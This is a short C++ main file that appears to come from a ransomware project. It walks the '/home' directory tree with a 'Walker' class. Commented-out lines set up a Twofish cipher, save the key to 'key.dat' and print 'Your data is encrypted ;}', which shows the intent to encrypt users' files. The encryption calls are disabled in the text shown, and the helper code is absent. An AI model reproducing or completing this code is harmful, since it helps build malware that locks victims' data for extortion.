#include <fstream>
#include <iostream>

#include "symmetric.hpp"
#include "walker.hpp"
#include "twofish.hpp"


int main(int argc, char **argv) {
    //std::shared_ptr<sisyph::Symmetric> coolCryptor(std::make_shared<sisyph::Twofish>());

    Walker shadowWalker("/home");

    shadowWalker.setCmdArgs(argc, argv);

    //std::ofstream saveKey("key.dat");

    //saveKey << coolCryptor->getKey();
    //saveKey.close();
    shadowWalker.walk();

    //std::cout << "Your data is encrypted ;}" << std::endl;

    return 0;
}
